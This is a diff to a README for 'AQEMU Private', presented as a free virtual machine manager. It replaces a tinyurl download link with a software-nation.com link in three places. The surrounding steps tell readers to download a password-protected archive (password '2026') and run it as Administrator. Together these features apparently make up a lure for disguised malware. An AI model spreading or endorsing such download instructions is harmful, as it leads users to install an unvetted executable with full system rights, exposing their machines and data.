@@ -9,7 +9,7 @@ The **💻 AQEMU Private** is a **free** lightweight virtual machine manager tha
 
 <div align="center">
 
-[![Download AQEMU Private](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/aqemu-private)
+[![Download AQEMU Private](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/aqemu-private)
 
 </div>
 
@@ -106,7 +106,7 @@ Running multiple operating systems usually requires expensive hardware or compli
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download AQEMU Private](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/aqemu-private)
+[![Download AQEMU Private](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/aqemu-private)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -261,7 +261,7 @@ Run multiple operating systems on your PC for free. **AQEMU Private** lets you c
 
 <div align="center">
 
-[![Download AQEMU Private](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/aqemu-private)
+[![Download AQEMU Private](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/aqemu-private)
 
 **Version 4.6.1** — Free virtual machine manager. April 2026 update. Zero cost. No payment.
 
